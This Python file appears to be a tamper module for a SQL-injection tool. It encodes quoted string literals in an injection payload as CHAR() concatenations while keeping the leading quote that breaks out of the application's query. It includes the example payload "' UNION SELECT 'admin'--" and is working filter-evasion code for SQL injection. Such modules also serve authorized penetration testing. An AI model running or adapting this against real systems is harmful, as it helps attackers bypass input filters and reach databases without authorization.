import re

__example_payload__ = "' UNION SELECT 'admin'--"
__type__ = "encode SQL string literals as CHAR() concatenation"
__category__ = "sqli"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

_STRING_LITERAL = re.compile(r"'((?:[^']|'')*)'")


def _to_char(match):
    content = match.group(1).replace("''", "'")
    if not content:
        return match.group(0)
    codes = ",".join(str(ord(char)) for char in content)
    return "CHAR({})".format(codes)


def tamper(payload, **kwargs):
    if not payload:
        return payload
    # A leading quote is usually the injection delimiter (closes the app's own
    # string), not a literal to encode. Keep it intact and encode the rest.
    head, rest = "", payload
    if rest[0] == "'":
        head, rest = "'", rest[1:]
    return head + _STRING_LITERAL.sub(_to_char, rest)
